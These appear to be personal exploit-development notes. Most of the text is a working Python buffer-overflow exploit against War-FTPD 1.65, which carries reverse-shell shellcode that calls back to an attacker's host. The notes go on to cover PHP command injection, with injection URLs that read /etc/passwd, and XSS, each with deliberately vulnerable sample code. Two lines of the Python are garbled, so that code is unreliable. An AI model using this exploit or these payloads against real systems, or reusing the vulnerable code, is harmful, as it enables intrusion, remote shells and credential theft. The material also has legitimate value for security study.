Goal: to build a POC exploit for the War-FTPD 1.65 application

How?
Long strings
submitted as a username will cause this application to crash in an exploitable manner.

`EIP => we control`
`ESP => exploit code will be placed here `
assembly `JMP ESP` => JUMP TO ESP

- EIP register (also called the Instruction Pointer) # holds addresses of current instruction
- ESP register (also called the Stack Pointer) # holds addresses of the STACK

Tools to use: Immunity Debugger, Metasploit

# Creating Python Exploits

```python
#!/usr/bin/python
import sys
import socket
hostname = sys.argv[1]
# Found JMP ESP in ntdll.dll "77F5801C"
# WINDOWS XP IS X86 platform and X86 platforms are little endian,
# so we put jmp esp command with the order reversed.
jmpesp = "\x1c\x80\xf5\x77"
# windows/shell_reverse_tcp - 314 bytes
# http://www.metasploit.com
# LHOST=192.168.1.11, LPORT=4444, ReverseConnectRetries = 5,
# EXITFUNC=process, InitialAutoRunScript=, AutoRunScript=
payload = (
"\xdb\xde\xbe\x23\x6d\x90\xee\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x4f\x31\x72\x19\x83\xc2\x04\x03\x72\x15\xc1\x98\x6c"
"\x06\x8c\x63\x8d\xd7\xee\xea\x68\xe6\x3c\x88\xf9\x5b\xf0"
"\xda\xac\x57\x7b\x8e\x44\xe3\x09\x07\x6a\x44\xa7\x71\x45"
"\x55\x06\xbe\x09\x95\x09\x42\x50\xca\xe9\x7b\x9b\x1f\xe8"
"\xbc\xc6\xd0\xb8\x15\x8c\x43\x2c\x11\xd0\x5f\x4d\xf5\x5e"
"\xdf\x35\x70\xa0\x94\x8f\x7b\xf1\x05\x84\x34\xe9\x2e\xc2"
"\xe4\x08\xe2\x11\xd8\x43\x8f\xe1\xaa\x55\x59\x38\x52\x64"
"\xa5\x96\x6d\x48\x28\xe7\xaa\x6f\xd3\x92\xc0\x93\x6e\xa4"
"\x12\xe9\xb4\x21\x87\x49\x3e\x91\x63\x6b\x93\x47\xe7\x67"
"\x58\x0c\xaf\x6b\x5f\xc1\xdb\x90\xd4\xe4\x0b\x11\xae\xc2"
"\x8f\x79\x74\x6b\x89\x27\xdb\x94\xc9\x80\x84\x30\x81\x23"
"\xd0\x42\xc8\x2b\x15\x78\xf3\xab\x31\x0b\x80\x99\x9e\xa7"
"\x0e\x92\x57\x61\xc8\xd5\x4d\xd5\x46\x28\x6e\x25\x4e\xef"
"\x3a\x75\xf8\xc6\x42\x1e\xf8\xe7\x96\xb0\xa8\x47\x49\x70"
"\x19\x28\x39\x18\x73\xa7\x66\x38\x7c\x6d\x11\x7f\xeb\x4e"
"\x8a\x7e\xe7\x26\xc9\x80\xe6\xea\x44\x66\x62\x03\x01\x31"
"\x1b\xba\x08\xc9\xba\x43\x87\x59\x5e\xd1\x4c\x99\x29\xca"
"\xda\xce\x7e\x3c\x13\x9a\x92\x67\x8d\xb8\x6e\xf1\xf6\x78"
"\xb5\xc2\xf9\x81\x38\x7e\xde\x91\x84\x7f\x5a\xc5\x58\xd6"
"\x34\xb3\x1e\x80\xf6\x6d\xc9\x7f\x51\xf9\x8c\xb3\x62\x7f"
"\x91\x99\x14\x9f\x20\x74\x61\xa0\x8d\x10\x65\xd9\xf3\x80"
"\x8a\x30\xb0\xb1\xc0\x18\x91\x59\x8d\xc9\xa3\x07\x2e\x24"
"\xe7\x31\xad\xcc\x98\xc5\xad\xa5\x9d\x82\x69\x56\xec\x9b"
"\x1f\x58\x43\x9b\x35"
)
username = "A"*485 + jmpesp + "\x90"*16 + payload + "A"*(1024 - 485 - 20
- len(payload))
passwd = "anything"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	sock.connect((hostname, 21))
except:
	print ("[-] Connection error!")
	sys.exit(1)
	
r = sock.recv(1024)
print "[+] " + r
sock.send("user %s\r\n" %username)
r Â¼ sock.recv(1024)
print "[+] " + r
sock.send("pass %s\r\n" %passwd)
r " sock.recv(1024)
print "[+] " + r
sock.close()
```

# Creating PHP Exploits
Most common vulnerabilities of PHP language:
1. Remote File Inclusion (RFI)
2. Cross-Site Scripting (XSS)

What differentiates RFI from Local File Inclusion (LFI) is that in RFI the codecan be on another server, hence the term "remote".

2 PHP functions play a role in RFI:
1. register_globals => define variables from GET/POST data
2. allow_url_include => visit arbitrary URLs

# Command Exec Vulnerabilities
Command execution vulnerabilities are the result of passing poorly sanitized
information to a shell function such as `passthru` or `system`. 
Vulnerable code:
```html
<?php
if($_GET['ip'])
{
print "<PRE>\n";
passthru("/usr/local/bin/traceroute {$_GET['ip']}");
print "</PRE>\n";
}
?>
<BR>
<FORM METHOD=GET>
IP: <INPUT TYPE=TEXT NAME=ip>
<INPUT TYPE=SUBMIT>
</FORM>
```
Example exploit codes: (notice semicolon ;)
`http://localhost/traceroute.php?ip=127.0.0.1;ls`
`http://localhost/traceroute.php?ip=127.0.0.1;cat /etc/passwd`

# XSS
to better exploit XSS vulns, use beEF https://github.com/beefproject/beef (The Browser Exploitation Framework)
Vulnerable code:
```html
<div align=center>
<FORM METHOD=GET>
Welcome to the easy search engine, input your query below:<BR>
<INPUT TYPE=TEXT NAME=query VALUE="<?php echo $_GET['query']?>">
<INPUT TYPE=SUBMIT VALUE="Search!"></BR>
</FORM>
<?php
if($_GET['query'])
{
print "<BR>You searched for " . htmlspecialchars($_GET['query']) .
"<BR>\n";
}
?>
</div>
```
`htmlspecialchars($_GET['query']` => safe
`VALUE="<?php echo $_GET['query']?>` => not safe (NO ESCAPE from html special chars)